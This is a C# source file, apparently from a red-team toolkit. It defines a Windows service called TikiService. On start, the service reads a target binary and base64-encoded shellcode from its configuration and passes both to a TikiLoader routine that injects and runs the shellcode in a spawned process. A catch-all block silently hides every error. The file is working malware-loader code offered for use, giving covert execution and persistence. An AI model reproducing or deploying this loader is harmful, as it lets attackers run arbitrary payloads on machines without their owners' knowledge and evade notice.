using System;
using System.Configuration;
using System.ServiceProcess;

using TikiLoader;

namespace TikiService
{
    public partial class TikiService : ServiceBase
    {
        public TikiService()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            try
            {
                var settings = ConfigurationManager.AppSettings;
                string binary = settings["Binary"];
                byte[] shellcode = Convert.FromBase64String(settings["Shellcode"]);

                var ldr = new Loader();
                ldr.LoadWithoutPid(binary, shellcode);
            }
            catch
            {
                //pokemon
            }
        }

        protected override void OnStop()
        {
        }
    }
}